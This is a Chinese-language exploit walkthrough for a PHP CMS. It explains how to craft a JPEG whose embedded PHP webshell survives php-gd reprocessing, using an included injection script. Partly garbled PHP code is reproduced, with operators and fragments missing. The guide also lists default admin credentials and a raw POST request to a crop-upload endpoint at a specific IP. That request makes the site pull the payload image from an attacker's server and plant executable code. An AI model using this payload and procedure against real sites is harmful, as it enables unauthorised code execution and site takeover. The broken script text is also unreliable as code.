在正常图片中插入shell并无视GD图像库的处理，常规方法有两种  
1、对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行  
2、利用php-gd算法上的问题进行绕过
这里我们选择第二种，使用脚本进行处理图片并绕过  
1、上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg  
2、执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg  
3、如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句
tips：  
1、图片找的稍微大一点 成功率更高  
2、shell语句越短成功率越高  
3、一张图片不行就换一张 不要死磕
图片处理脚本，还有具体操作会在验证部分详细写出！！！
### 测试与利用
漏洞复现材料（cms源码，攻击脚本，攻击图片） ：链接： 密码：tsna  
（自己的php-web环境的vps上,一定要是phpweb环境（并开启短标签），phpweb环境（并开启短标签），其他环境也可，但需要自行构造payload所需的图片）  
本地验证  
①首先登陆后台
②生成能经过php-GD处理后仍然能够保留webshell语句的图片  
首先准备一张图片，并重名faith.php
过GD处理渲染的处理脚本
        In case of successful injection you will get a specially crafted image, which should be uploaded again.
        Since the most straightforward injection method is used, the following problems can occur:
        1) After the second processing the injected data may become partially corrupted.
        2) The jpg_payload.php script outputs "Something's wrong".
        If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another 
        initial image.
        Sergey Bobrov @Black2Fan.
        See also:
        https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
        */
        $miniPayload = "';?>";
        if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
            die('php-gd is not installed');
        }
        if(!isset($argv[1])) {
            die('php jpg_payload.php ');
        }
        set_error_handler("custom_error_handler");
        for($pad = 0; $pad readShort() != 0xFFD8) {
                die('Incorrect SOI marker');
            }
            while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
                $marker = $dis->readByte();
                $size = $dis->readShort() - 2;
                $dis->skip($size);
                if($marker === 0xDA) {
                    $startPos = $dis->seek();
                    $outStreamTmp = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        str_repeat("\0",$nullbytePayloadSize) . 
                        substr($outStream, $startPos);
                    checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                    if($extraBytes !== 0) {
                        while((!$dis->eof())) {
                            if($dis->readByte() === 0xFF) {
                                if($dis->readByte !== 0x00) {
                                    break;
                                }
                            }
                        }
                        $stopPos = $dis->seek() - 2;
                        $imageStreamSize = $stopPos - $startPos;
                        $outStream = 
                            substr($outStream, 0, $startPos) . 
                            $miniPayload . 
                            substr(
                                str_repeat("\0",$nullbytePayloadSize).
                                    substr($outStream, $startPos, $imageStreamSize),
                                0,
                                $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                    substr($outStream, $stopPos);
                    } elseif($correctImage) {
                        $outStream = $outStreamTmp;
                    } else {
                        break;
                    }
                    if(checkImage('payload_'.$argv[1], $outStream)) {
                        die('Success!');
                    } else {
                        break;
                    }
                }
            }
        }
        unlink('payload_'.$argv[1]);
        die('Something\'s wrong');
        function checkImage($filename, $data, $unlink = FALSE) {
            global $correctImage;
            file_put_contents($filename, $data);
            $correctImage = TRUE;
            imagecreatefromjpeg($filename);
            if($unlink)
                unlink($filename);
            return $correctImage;
        }
        function custom_error_handler($errno, $errstr, $errfile, $errline) {
            global $extraBytes, $correctImage;
            $correctImage = FALSE;
            if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
                if(isset($m[1])) {
                    $extraBytes = (int)$m[1];
                }
            }
        }
        class DataInputStream {
            private $binData;
            private $order;
            private $size;
            public function __construct($filename, $order = false, $fromString = false) {
                $this->binData = '';
                $this->order = $order;
                if(!$fromString) {
                    if(!file_exists($filename) || !is_file($filename))
                        die('File not exists ['.$filename.']');
                    $this->binData = file_get_contents($filename);
                } else {
                    $this->binData = $filename;
                }
                $this->size = strlen($this->binData);
            }
            public function seek() {
                return ($this->size - strlen($this->binData));
            }
            public function skip($skip) {
                $this->binData = substr($this->binData, $skip);
            }
            public function readByte() {
                if($this->eof()) {
                    die('End Of File');
                }
                $byte = substr($this->binData, 0, 1);
                $this->binData = substr($this->binData, 1);
                return ord($byte);
            }
            public function readShort() {
                if(strlen($this->binData) binData, 0, 2);
                $this->binData = substr($this->binData, 2);
                if($this->order) {
                    $short = (ord($short[1]) binData||(strlen($this->binData) === 0);
            }
        }
    ?>
使用脚本进行处理，新生成的文件就能过GD
过GD的新文件 payload_faith.php
然后将新文件放到自己的php-web环境的vps上,一定要是phpweb环境（并开启短标签），phpweb环境（并开启短标签，php默认开启）（因为payload是php语句），其他环境也可，但需要自行构造payload所需的图片
③将各个参数补齐，发送最后的Payload  
查看原图的长宽高
w=x2=图片宽度  
h=y2=图片高度  
x1=y1=固定0  
根据你自己的图片做调整
④phpinfo()代码执行验证，访问最后的文件，在网站跟目录
### 网络验证
后台地址：
账号密码：admin admin888 弱口令
①直接使用生成好的过GD文件payload_faith.php，并放到自己的vps上面
②发送payload
    POST /Plug/Input/cropzoomUpload.html HTTP/1.1
    Host: 104.224.134.110
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Cookie: PHPSESSID=f8gk8cjfvj1e2to5gplnh5ifi7
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 192
    viewPortW=500&viewPortH=334&imageX=0&imageY=0&imageRotate=0&imageW=500&imageH=334&imageSource=http://x.x.x.x/payload_faith.php?1.jpg&selectorX=0&selectorY=0&selectorW=500&selectorH=334
③通过执行phpinfo()进行验证漏洞